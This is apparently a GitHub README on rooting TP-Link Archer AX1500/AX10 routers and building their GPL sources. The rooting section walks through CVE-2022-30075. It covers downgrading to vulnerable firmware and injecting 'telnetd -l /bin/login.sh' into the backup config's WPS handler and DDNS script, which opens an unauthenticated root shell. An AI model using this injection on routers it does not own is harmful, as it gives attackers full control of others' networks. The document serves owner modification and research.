# TPLink Archer AX1500 v1, AX1500 v1.2, AX10 v1, AX10 v1.2 GPL compilation utils. 

These scripts are optimized for TP-Link Archer AX1500 v1, v1.2; Archex AX10 v1, v1.2 routers. The repository provides information about rooting these routers and about ways to compile GPL sources for them.

The GPL sources provided by TP-Link contain a lot of helpful tools to work with these routers. Altough GPL codes do not build to binary installable firware, they provides the kernel and OpenWRT SDK. OpenWRT SDK allows developers to build their packages and even kernel modules for the router. But GPL is useless if you have no access to your router, so before compilation of sources you should [root the router](#rooting).

## Rooting

For the information and research in the rooting strategies a big thank goes to [@gmaxus](https://github.com/gmaxus). He texted me and we were able to find the information and to finally root the router. 

So, rooting. In fact, rooting of your router considered as hack and is not expected by the TP-Link. Also the warranty may disappear. As of now, here is the [CVE 2022-30075](https://nvd.nist.gov/vuln/detail/cve-2022-30075) in the old versions of firmware that allows rooting. The CVE is implemented in https://github.com/aaronsvk/CVE-2022-30075 and we will use this repository. We with @gmaxus were able to root our devices with some modifications in the configuration file.

Before the hacking process you should ensure that you have the firmware with the CVE. Just install one before July 2022. On my router downgrade to v1.3.1 did the trick. You can find the firmware with the web archive. I was not able to install v1.2.*, but v1.3.1 also has the exploit. If you are not able to jump from the latest version to v1.3.1, downgrade one version by one. I was able to install US v1.3.1 on my router. Useful links:
https://www.tp-link.com/ru/support/download/archer-ax1500/v1/#Firmware
https://web.archive.org/web/20230520093831/https://www.tp-link.com/us/support/download/archer-ax1500/v1/

Note that the link to the firmware binary may not be archived, but it is accessible by tp link website.

You should follow these steps:
- Clone the repository `git clone https://github.com/aaronsvk/CVE-2022-30075.git`.
- cd into it `cd CVE-2022-30075`.
- Install the required python packages `pip install requests pycryptodome`. If you got some errors here you may want to install python 3.9 in the virtual environment.
- Download the configuration file from the router with command `python tplink.py -b -t 192.168.0.1 -p your_password`. Where your_password stands to the password you use to login into the router and 192.168.0.1 ip address of your device. This command will load the configuration from your router.
- Fixup the configuration. The configuration is stored in `ArcherAX1500v120220401131n/ori-backup-user-config.xml`. Note that the directory name may vary from device to device. You should replace
```
<button name="wps_button">
<action>released</action>
<max>1999</max>
<handler>/lib/wifi/wps_button</handler>
<min>0</min>
<button>wifi</button>
</button>
```
with
```
<button name="exploit">
<action>released</action>
<max>1999</max>
<handler>/usr/sbin/telnetd -l /bin/login.sh</handler>
<min>0</min>
<button>wifi</button>
</button>
```
as well as
```
<ddns>
<provider name="provider">
<provider>tp-link</provider>
</provider>
<service name="dyndns">
<enabled>off</enabled>
<interface>wan</interface>
<force_unit>hours</force_unit>
<ip_network>wan</ip_network>
<service_name>dyndns.org</service_name>
<check_unit>hours</check_unit>
<retry_interval>60</retry_interval>
<ip_source>network</ip_source>
<retry_unit>seconds</retry_unit>
<check_interval>1</check_interval>
<force_interval>72</force_interval>
<retry_times>5</retry_times>
</service>
<service name="noip">
<service_name>noip.com</service_name>
<retry_unit>seconds</retry_unit>
<check_interval>1</check_interval>
<interface>wan</interface>
<enabled>off</enabled>
<force_unit>hours</force_unit>
<ip_network>wan</ip_network>
<check_unit>hours</check_unit>
<retry_interval>60</retry_interval>
<ip_source>network</ip_source>
<wan_bind>disable</wan_bind>
<force_interval>72</force_interval>
<retry_times>5</retry_times>
</service>
</ddns>
```
to
```
<ddns>
<provider name="provider">
<provider>tp-link</provider>
</provider>
<service name="dyndns">
<enabled>off</enabled>
<interface>wan</interface>
<force_unit>hours</force_unit>
<ip_network>wan</ip_network>
<service_name>dyndns.org</service_name>
<check_unit>hours</check_unit>
<retry_interval>60</retry_interval>
<ip_source>network</ip_source>
<retry_unit>seconds</retry_unit>
<check_interval>1</check_interval>
<force_interval>72</force_interval>
<retry_times>5</retry_times>
</service>
<service name="noip">
<service_name>noip.com</service_name>
<retry_unit>seconds</retry_unit>
<check_interval>1</check_interval>
<interface>wan</interface>
<enabled>off</enabled>
<force_unit>hours</force_unit>
<ip_network>wan</ip_network>
<check_unit>hours</check_unit>
<retry_interval>60</retry_interval>
<ip_source>network</ip_source>
<wan_bind>disable</wan_bind>
<force_interval>72</force_interval>
<retry_times>5</retry_times>
</service>
<service name="exploit">
<ip_script>/usr/sbin/telnetd -l /bin/login.sh</ip_script>
<username>X</username>
<retry_unit>seconds</retry_unit>
<check_interval>12</check_interval>
<interface>internet</interface>
<enabled>on</enabled>
<force_unit>days</force_unit>
<check_unit>hours</check_unit>
<domain>x.example.org</domain>
<password>X</password>
<retry_interval>5</retry_interval>
<ip_source>script</ip_source>
<update_url>http://127.0.0.1/</update_url>
<force_interval>30</force_interval>
<retry_times>3</retry_times>
</service>
</ddns>
```

Note that settings may vary from one device to another. In the second case you should just find `<ddns></ddns>` section and append
```
<service name="exploit">
<ip_script>/usr/sbin/telnetd -l /bin/login.sh</ip_script>
<username>X</username>
<retry_unit>seconds</retry_unit>
<check_interval>12</check_interval>
<interface>internet</interface>
<enabled>on</enabled>
<force_unit>days</force_unit>
<check_unit>hours</check_unit>
<domain>x.example.org</domain>
<password>X</password>
<retry_interval>5</retry_interval>
<ip_source>script</ip_source>
<update_url>http://127.0.0.1/</update_url>
<force_interval>30</force_interval>
<retry_times>3</retry_times>
</service>
```
into it.

This configuration injects the _malicious code_ that will start the telnet session on your router. And anyone from the local network will be able to connect into it. Please note, that if iptables configured wrong this may be exposed to the internet so anyone may connect to the root session on your router, so you should use it carefully. May be you may want to change that telnet command to something like automated bash script in the future.

Now you should run `python tplink.py -t 192.168.0.1 -p your_password -r ArcherAX1500v120220401131n` which is likely the same as previous one except that it will commit new configuration to the router. The router will be rebooted automatically.

After the reboot you should click the WPS button on the router and the telnet session will be opened. Now you can do anything with your device. 
Connect to it with `telnet 192.168.0.1`. On windows you may use telnet session on PuTTY.

Now you are root and you may do anything with your device. The real filesystem is read-only, packed and securely stored on your device so anything you will change here will be disappeared after restart. Now you able to change firewall settings, install packages in temporary memory (Device RAM). On my router here is 256 MB of RAM which is too much for the comfortable work. But you should never forget about the security and close the telnet session as soon as it possible (just `killall -9 telnetd` should do the trick).

Now when you have the root access, you may continue your research on further hacking of the router. In next chapters I will show you how to compile the GPL sources and use OpenWRT SDK.

## GPL

It is based on ubuntu precise 12.04 and uses docker to run it on any host.

How to run:
- Build a docker image `docker build -t router_build .`
- Enter a docker container and mound sources as a volume `docker run -it -v /home/vetrov/ax1500v1_GPL:/router router_build`    
- cd the volume `cd /router`
- Patch the sources. `patch -p1 < ../router.patch` This step updates source mirrors from where files should be downloaded. Files keep their checksums.
- Update luci. `mkdir -p Iplatform/openwrt/dl/ && cp /luci-0.11.1.tar.gz /router/Iplatform/openwrt/dl/`
I wasn't able to patch this package so I decided to simpy download it and pass to the make. Checksum also keeps because you downloaded this file from the mirror git repository with the same commit hash (check Dockerfile)
- go to the build dir `cd Iplatform/build`
- And make the sources `make SHELL=/bin/bash V=s` Shell=/bin/bash ensures that make will use bash by default (needed for build), V=s enables verbose mode that produces more detailed output. At the beginning of the make process it will ask you for some details. Feel free to simply press enter and choose the default option.

Possible errors in the build process: GPL sources are extremly legacy thing. And errors seems to be generated by random. This repository just makes them more painless. 

A lot of packets are too old (2013 year) and a lot of them has been deleted from mirrors or even some mirrors were disabled. If any errors encountered in the build process it is likely related to the internet resources that provides the package. To resolve these errors you have to manually find the specific version of the package and update Makefiles (see router.patch for reference).

Thanks:

JonathanNakandala for [post on openwrt forum](https://forum.openwrt.org/t/tp-link-archer-ax1500-70-802-11ax-router-support/48781/22) with starting research in this theme

[@gmaxus](https://github.com/gmaxus) for help with TP-Link rooting.
